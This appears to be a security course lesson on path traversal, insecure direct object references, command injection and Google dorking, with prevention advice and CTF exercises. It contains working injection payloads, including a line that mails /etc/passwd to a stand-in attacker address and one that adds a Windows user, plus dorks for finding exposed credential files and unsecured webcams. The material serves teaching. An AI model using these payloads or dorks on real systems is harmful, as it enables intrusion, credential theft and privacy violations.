# Burp Suite configuration

https://portswigger.net/support/configuring-your-browser-to-work-with-burp

https://portswigger.net/support/checking-your-browser-proxy-configuration

https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser

# Introduction

Developers (including web developers) make minor mistakes all the time. Improper input sanitization, allowing users to access resources without properly verifying their privileges and letting web crawlers traverse sensitive paths of your website are just 3 such examples. Many developers do not realise the risks and underestimate the difficulty of implementing reliable access controls mechanisms, which in turn makes numerous websites vulnerable to these types of attacks.

# Path Traversal

In many web applications, resources are accessed using a filename as a parameter. This file is processed and displayed to the client by the application. If the application does not verify the parameter, the attacker might be able to exploit the application and display an arbitrary file from the target system. Normally an attacker would try to access password or configuration files to gain access to the system. Obviously, server-side script files could be accessed to perform manual inspection for vulnerabilities. Consider the following URL:  
  
`http://example.com/view.php?file=image.jpg`  
  
If the attacker wants to investigate the view.php file for possible exploitable coding mistakes, he would try to use the script in order to open the file:  
  
`http://example.com/view.php?file=view.php  `
  
It is likely that images are stored in a subdirectory, so the attacker might have to access the parent directory:  
  
`http://example.com/view.php?file=../view.php` or `http://example.com/view.php?file=../../view.php`  
  
Depending on the system, a backslash could also be used:  
  
`http://example.com/view.php?file=..\..\view.php ` 
  
An example of accessing system files:  
  
`http://example.com/view.php?file=../../../../etc/passwd`  
  
![Path Traversal](https://github.com/hexcellents/sss-web/blob/master/03-broken-access-control/support/path_traversal.png)  

## Path Traversal Prevention

The application should not allow directory traversal or the accessing of arbitrary files. If the files to be accessed are known, the application should implement a mapping between the file and application-specific identifier. This identifier can be hard coded in the application to prevent any malicious attempts to modify it.  
  
If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks:  
  
* The application should validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values. If that isn't possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters.
* After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.  
  
Below is an example of some simple Java code to validate the canonical path of a file based on user input:  
  
`File file = new File(BASE_DIRECTORY, userInput);`  
`if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {`  
`// process file`  
`}`  
  
## Exercises
  
1. Let's Traverse the Universe ([https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions](https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions))  

# Insecure Direct Object References

Insecure direct object reference vulnerability is similar to path traversal vulnerability. The application allows access to resources using an identifier which is controllable by the user. In this case, however, the identifier is not a file / path as is the case with path traversal.  
  
Consider the following case where a user is able to view his own invoice:  
  
`http://www.example.com/view.php?invoice=24411`  
  
Now, by changing the invoice number the user might be able to access other invoices, including ones that are not his own, thereby gaining access to the sensitive information of other users. Obviously the application should enforce access control over the items to be accessed. If  the application fails to do so, this would be a case of insecure direct object reference vulnerability.  
  
When performing penetration tests, the application parameters should certainly be investigated by iterating through possible values and observing the responses.  
  
![Insecure Direct Object References](https://github.com/hexcellents/sss-web/blob/master/03-broken-access-control/support/insecure_direct_object_references.png)  

## Insecure Direct Object References Prevention

First, you should control all normal, ajax and API requests when creating an app. For example, can a read-only user write anything in the app? Or can a non-admin user access and create API tokens that should only be created by an admin user? So, in order to test all the possible IDOR vulnerabilities, you should think like a hacker.  
  
You can provide permissions on your application for all endpoints. If your “privatesection” endpoint includes the API requests such as “/api/privatesection/admins”, “/api/privatesection/console”, “/api/privatesection/tokens”, you can block the endpoint for non-admin users.  
  
Moreover, to make the attacker’s job harder or prevent it altogether, you can use hash functions and hashed values instead of regular numbers and strings.  
  
## Exercises
  
1. How Far Does This Go? ([https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions](https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions))  
2. Mind Your Own Business ([https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions](https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions))  
  
# Command Injection

Injection attacks refer to a broad class of attack vectors. In an injection attack, an attacker supplies untrusted input to a program. This input gets processed by an interpreter as part of a command or query. In turn, this alters the execution of that program.  
  
Injections are amongst the oldest and most dangerous attacks aimed at web applications. They can lead to data theft, data loss, loss of data integrity, denial of service, as well as full system compromise. The primary reason for injection vulnerabilities is usually insufficient user input validation. Some examples include: **SQL injection (SQLi)**, **Cross-site Scripting (XSS)** and **Code Injection**.  
  
**Command injection** is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application.  
  
**Example**  
The following PHP code snippet is vulnerable to a command injection attack:  
`<?php`  
`print("Please specify the name of the file to delete");`  
`$file=$_GET['filename'];`  
`system("rm $file");`  
`?>`  
  
The following request and response is an example of a successful attack:  
  
Request  
`http://127.0.0.1/delete.php?filename=bob.txt;id`  
  
Response  
`Please specify the name of the file to delete`  
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`  

## Exploiting a Command Injection vulnerability

First, you need to find all the places where your application invokes a system command to perform an operation. The following list compiles popular functions attacked during command injection:  
  
| Function                                                 | Language      |
| -------------------------------------------------------- | ------------- |
| `system`, `execlp`, `execvp`, `ShellExecute`, `_wsystem` | C/C++         |
| `Runtime.exec`                                           | Java          |
| `exec`, `eval`	                                   | PHP           |
| `exec`, `open`, `eval`                                   | Perl          |
| `exec`, `eval`, `execfile`, `input`                      | Python        |
| `Shell`, `ShellExecuteForExplore`, `ShellExecute`        | Visual Basic  |
  
After finding these places, start exploring how the application handles the basic characters needed for command injection.  
  
The following two strings are good to try as they contain both commands and command injection characters:  
  
`abc;dir C:|xyz&netstat` (Windows)  
  
`abc;ls|cp&rm` (UNIX)  
  
If the application doesn’t give an error message because of the special characters then there is a chance that it suffers from a command injection bug.
A file not found error rather than an invalid data format error is a good hint that the application is processing the special characters as part of the file. For example, you might get a file not found error when using the following string:  
  
`file.txt|dir c:`  
  
This is because the application is calling exec() with the following string:  
  
`cmd /c type "c:\public_html\user_files\file.txt|dir c:"`  
  
For the input string to execute the directory listing command you need to close the double quotes before appending the extra command:  
  
`file.txt"|dir c:`  
  
Pay extra attention to quotes and double quotes since omitting them can easily result in the injection string treated as data.  
  
## Exercises  
  
1. Did Anybody Say Hashing? ([https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions](https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions))  

## Blind OS Command Injection

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.  
  
**Detection**  
  
You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond. The ping command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run:  
  
`& ping -c 10 127.0.0.1 &`  
  
This command will cause the application to ping its loopback network adapter for 10 seconds.  
  
Another method is to chain to the end of the input the linux command “sleep”, such as:  
  
`http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10`  
  
With this request the output, if vulnerable, would come through as expected with the “Success” message, however it would take a noticeable amount of time to return – something around 10 seconds longer than without the payload. To determine if this was just a laggy server or not you could try multiple different delay levels to see if the received delay matches the expected amount. So sleep 10 causes approximately a 10 second delay and sleep 30 causes approximately a 30 second delay, reducing the likelihood that this is a false positive.  
  
Useful commands to keep in mind when exploiting a blind OS command injection:  
  
| Command                                            | Explanation                                 |
| -------------------------------------------------- | ------------------------------------------- |
| `file.txt;mail attacker@attacker.org </etc/passwd` | Emails the attacker the server’s passwords  |
| `file.txt \| net user /add "hacker"`               | Adds hacker to the Windows user database    |
| `file.txt;ping%20attacker_site`	             | Pings the attacker site                     |

**Prevention**  
  
If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.  
  
If it is considered unavoidable to incorporate user-supplied data into operating system commands, the following layers of defense should be used to prevent attacks:  
  
* The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.  
* Most web frameworks do provide their own set of APIs that have been thoroughly tested and should be used for input validation and interpretation (e.g. commands, SQL queries etc). There is no need to reinvent the wheel when there are safer alternatives.  
* The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process. Start do not support shell metacharacters.

# Google Hacking - Google Dorking

A Google Dork, also known as Google Dorking or Google hacking, is a valuable resource for security researchers. For the average person, Google is just a search engine used to find text, images, videos, and news. However, in the infosec world, Google is a useful hacking tool.  
  
## How would anyone use Google to hack websites?

While you can’t hack sites directly using Google, it has tremendous web-crawling capabilities: it can index almost anything within your website, including sensitive information. This means you could be exposing too much information about your web technologies, usernames, passwords, and general vulnerabilities without even knowing it.  
  
In other words: Google “Dorking” is the practice of using Google to find vulnerable web applications and servers by using native Google search engine capabilities.  
  
Google hacking search queries can be used to identify security vulnerabilities in web applications, gather information for arbitrary or individual targets, discover error messages disclosing sensitive information, discover files containing credentials and other sensitive data.  
  
Finding information using search engines is a skill which can be learned with training and using examples. [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) is a great starting point.  
  
**NOTE:** Google has protections against automated search queries. Frequent queries with advanced operators will cause Captcha pages to appear. If frequent Google hacking queries are made despite Captchas, Google could block the IP of the sender for some days. This is an unfortunate incident if you happen to be inside a larger organizational network with NAT and one external IP. The whole organization will be blocked from using Google in this case. There are few possibilities for circumventing this, such as using web proxies.  
  
## Popular Google Dork operators

* **quotes** (“word”): using quotes around the phrases you are searching for will help you find results that are exact match results, rather than the broad results you will get with standard search. e.g. `“security summer school”`
* *: wildcard used to search pages that contain “anything” before your word, e.g. `how to * a website`, will return “how to…” design/create/hack, etc… “a website”.
* **|**: this is a logical operator, e.g. `"security" | "summer school"` will show all the sites which contain “security” or “summer school” or both words.
* **+**: used to concatenate words, useful to detect pages that use more than one specific key, e.g. `security + summer school`
* **–**: minus operator is used to avoiding showing results that contain certain words, e.g. `cat -dog` will show pages that use “cat” in their text, but not those that have the word “dog”
* **cache**: this dork returns the most recent cached version of a web page (providing the page is indexed, of course), e.g. `cache:gov.ro`
* **allintext**: searches for specific text contained on any web page, e.g. `allintext:hacking tools`
* **intext**: useful to locate pages that contain certain characters or strings inside their text. This operator is a more global operator that allows you to find any terms showing up on a webpage in any area – like the title, the page itself, the URL, and elsewhere. e.g. `intext:"safe internet"`
* **allintitle**: exactly the same as allintext, but will show pages that contain titles with X characters, e.g. `allintitle:"Security Companies"`
* **intitle**: used to search for various keywords inside the title, for example, `intitle:security` tools will search for titles beginning with “security” but “tools” can be somewhere else in the page
* **allinurl**: it can be used to fetch results whose URL contains all the specified characters, e.g: `allinurl:amazon drawing tablet`. This will bring up all internal URLs on Amazon.com that have the terms “drawing tablet”.
* **inurl**: if you wanted to find pages on a site that has your targeted search term in the URL, and the second term in content on a website, you could use this operator, e.g. `inurl:drawing portraits`
* **filetype**: used to search for any kind of file extensions, for example, if you want to search for PDF files you can use: `apple filetype:pdf`
* **site**: if you are in need of more specific results that are catered to a single website, this command will help you bring those results up. For example, if you wanted to find info about the CTFs from Security Summer School, you would use the following `site:security.cs.pub.ro CTF`  
  
**NOTE:** There’s no space between the operator, the colon, and the search term! e.g. `operator:search_term`  
  
## Anonymous Googling

Google’s cache feature is very useful. If Google crawls a page or document, you can almost always get a copy of it, even if the original source has since dried up and blown away. The down side of this is that hackers can get a copy of your sensitive data even if you’ve pulled the plug on that pesky Web server.  
  
Take, for example, the following google query: **cache:phrack.org**  

![Cache](https://github.com/hexcellents/sss-web/blob/master/03-broken-access-control/support/cache.png)
  
Some folks use the cache link as an anonymizer, thinking the content comes from Google.  
  
However, if we were to examine the output of the tcpdump, we would notice that when viewing the cached copy of the Phrack Web page, we are pulling images _directly from the Phrack server itself_. If we were striving for anonymity by viewing the Google cached page, we just blew our cover!  
  
Not only were we not anonymous, but our browser informed the Phrack Web server that we were trying to view a cached version of the page! So much for anonymity.  
  
It’s worth noting that most real hackers use proxy servers when browsing a target’s Web pages, and even their Google activities are first bounced off a proxy server. If we had used an anonymous proxy server for our testing, the Phrack Web server would have gotten our proxy server’s IP address only, not our actual IP address.  
  
The cache banner does, however, provide an option to view only the data that Google has captured, without any external references. If we take the URL of a website from a google search and append the following parameter **&strip=1**, it will force a Google cache URL to display only cached text, avoiding any external references.  
  
For this to work, instead of using **cache:example.com** into a Google search, use the following URL, to view the Google’s cached data only, not the target’s:  
  
`http://webcache.googleusercontent.com/search?q=cache:http://www.example.com&strip=1`  
  
## Search Engine Hacking Prevention

Unfortunately, once sensitive information is available on the Web, and thus available via a search engine, a professional information-digger will most probably get his or her hands on it. However, there are a few measures one can easily apply to prevent search engine related incidents. Prevention includes making sure that a search engine does not index sensitive information. An effective Web Application Firewall should have such a configurable feature – with the ability to correlate search engines’ user-agent or a range of search engines’ IP addresses with patterns on requests and replies that hint of sensitive information, such as non-public folder names like “/etc” and patterns that look like credit card numbers, and then blocking replies if there is a chance of leakage.  
  
Detection of sensitive data appearing in a web search includes periodically checking Google to see whether information has leaked.  
  
## robots.txt: Preventing Caching

The **robots.txt** file provides a list of instructions for automated Web crawlers, also called robots or bots. Standardized at [http://www.robotstxt.org/robotstxt.html](http://www.robotstxt.org/robotstxt.html), this file allows you to define, with a great deal of precision, which files and directories are off-limits to Web robots. The robots.txt file must be placed in the root of the Web server with permissions that allow the Web server to read the file. Lines in the file beginning with a # sign are considered comments and are ignored. Each line not beginning with a `#` should begin with either a User-agent or a disallow statement, followed by a colon and an optional space. These lines are written to disallow certain crawlers from accessing certain directories or files.  
  
Each Web crawler should send a user-agent field, which lists the name or type of the crawler. The value of Google’s user-agent field is Googlebot. To address a disallow to Google, the user-agent line should read:  
  
`User-agent: Googlebot`  
  
According to the original specification, the wildcard character `*` can be used in the user-agent field to indicate all crawlers. The disallow line describes what, exactly; the crawler should not look at.  
  
**NOTE:** Hackers don’t have to obey your robots.txt file. In fact, Web crawlers really don’t have to either, although most of the big-name Web crawlers will, if only for the “CYA” factor. One fairly common hacker trick is to view a site’s robots.txt file first to get an idea of how files and directories are mapped on the server. In fact a quick Google query can reveal lots of sites that have had their robots.txt files crawled. This, of course, is a misconfiguration, because the robots.txt file is meant to stay behind the scenes.  
  
## Wayback Machine

The Wayback Machine is a digital archive of the entire internet. It allows the user to go “back in time” and see what websites looked like in the past. For a hacker, it can be useful to see what information was displayed on a website a few months ago or even a few years ago.  
The Wayback Machine can be found at [https://archive.org/web/](https://archive.org/web/).  
  
## Sitemap.xml

The sitemap.xml is a simple XML page which could be available on some websites and provide a “roadmap” for Google to the important pages that need to be crawled. It’s a SEO (Search Engine Optimization) tool to help with the visibility of your website on the internet, but it could also be useful for a hacker, serving basically the same purpose: to give him a roadmap to every page.  
  
## Examples of Google Dorking

### Explore LOG Files For Login Credentials
`allintext:password filetype:log after:2019` - Finds exposed log files that might contain passwords.  
  
`allintext:username filetype:log` - Finds logs that contain usernames.  
  
**Prevention:** Do not allow Google to access important data of your website, by properly configuring robots.txt.  
  
### Explore Configurations Using **ENV** files
  
.env is used by various popular web development frameworks to declare general variables and configurations.  
  
`DB_USERNAME filetype:env`  
`DB_PASSWORD filetype:enc=v`  
  
By using the command you can find a list of sites that expose their _.env_ file on the internet. Developers may accidentally include the _.env_ file in the public directory of the website, which can cause great harm if cyber criminals find it.  
  
If you click into any of the exposed .env files, you will notice unencrypted usernames, passwords and IPs are directly exposed in the search results.
**Prevention:** _.env_ files should **not** be in a publicly accessible folder.  
  
### Explore Live Webcams
Maybe one of the creepiest usages of Google Dorks, numerous webcams can be watched by anyone on the internet.  
  
To monitor what’s happening in your area, the security cameras have to be connected to the internet. And the moment you connect any device to the internet “hypothetically” someone can get access to it.  
  
What’s even scarier is once a camera is compromised, a “hacker” can make “lateral movements” into other connected devices!  
  
So a hacker could, in theory, disable your alarm system, hack your computer, torment your household by blasting music, turn on your TV and much more. As long as it is connected to the same network. Lots of people forget to change the default credentials, so it might be as simple as trying them on various webcams.  
  
Example of searches to access security webcams:

* `intitle:liveapplet` - Mostly security cameras, car parks, colleges, clubs, bars etc.
* `intitle:”snc-rz30 home”` - Mostly security cameras, shops, car parks etc.
* `inurl:LvAppl intitle:liveapplet` - Mostly security cameras, car parks, colleges etc.
* `Inurl:lvappl` - A huge list of webcams around the world
* `inurl:axis-cgi/jpg` - Mostly security cameras.
* `inurl:”webcam.html”` - Mostly European security cameras.
* `control/userimage.html` - Webcams

## Hacking Security Cameras Using Shodan  
**Shodan** is a search engine for Internet-connected devices. Google lets you search for websites, Shodan lets you search for every device connected to the internet.  https://www.shodan.io/
  
## Exercises  
  
1. Beep Beep Boop ([https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions](https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions))
2. You have 15 minutes to find the most interesting thing you can using Google Dorks.  
  
Good starting point: https://www.exploit-db.com/google-hacking-database  
  
**NOTE:** Keep in mind that intentionally accessing a computer without authorization is illegal in most countries. Therefore, guessing the credentials of a webcam or testing the default ones is in a grey area.  
    

## More Exercises on PortSwigger 
  
1. PortSwigger Exercise ([https://portswigger.net/web-security/os-command-injection/lab-simple](https://portswigger.net/web-security/os-command-injection/lab-simple))  

2. PortSwigger Exercise ([https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays))  

3. PortSwigger Exercise ([ https://portswigger.net/web-security/file-path-traversal/lab-simple](https://portswigger.net/web-security/file-path-traversal/lab-simple))

4. PortSwigger Exercises ([https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references))  

# Resources

* [1] Metropolia University of Applied Sciences  
* [2] https://portswigger.net/web-security/file-path-traversal  
* [3] https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/  
* [4] https://securitytrails.com/blog/google-hacking-techniques  
* [5] https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf  
* [6] https://www.imperva.com/learn/application-security/google-hacking/  
* [7] https://ahrefs.com/blog/google-advanced-search-operators/  
* [8] https://pentest-tools.com/information-gathering/google-hacking  
* [9] http://index-of.es/Varios/Johnny%20Long,%20Bill%20Gardner,%20Justin%20Brown-Google%20Hacking%20for%0Penetration%20Testers-Syngress%20(2015).pdf  
* [10] https://hackingpassion.com/google-dorks-an-easy-way-of-hacking/#define  
* [11] https://www.acunetix.com/websitesecurity/google-hacking/  
* [12] https://owasp.org/www-community/attacks/Command_Injection  
* [13] https://blog.securityinnovation.com/blog/2011/06/how-to-test-for-command-injection.html  
* [14] https://portswigger.net/web-security/os-command-injection  
* [15] https://gracefulsecurity.com/command-injection-the-good-the-bad-and-the-blind/  
* [16] https://www.acunetix.com/blog/articles/injection-attacks/  